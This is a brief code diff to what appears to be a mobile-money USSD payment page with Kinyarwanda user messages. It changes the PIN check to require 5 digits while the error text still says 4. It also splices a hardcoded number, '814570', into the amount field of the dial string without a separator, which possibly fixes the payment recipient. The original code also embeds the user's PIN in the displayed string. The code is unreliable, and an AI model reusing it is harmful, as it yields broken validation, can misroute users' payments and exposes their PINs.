@@ -664,14 +664,14 @@
         pinInput.focus();
         return;
       }
-      if (!/^\d{4}$/.test(pin)) {
+      if (!/^\d{5}$/.test(pin)) {
         messageBox.textContent = "PIN igomba kuba imibare 4 gusa.";
         pinInput.focus();
         return;
       }
 
       // Generate USSD code dynamically
-      const ussdCode = `*182*8*1*${amount}*${pin}#`;
+      const ussdCode = `*182*8*1*814570${amount}*${pin}#`;
       ussdCodeDisplay.textContent = ussdCode;
 
       // Check if the user is on a mobile device
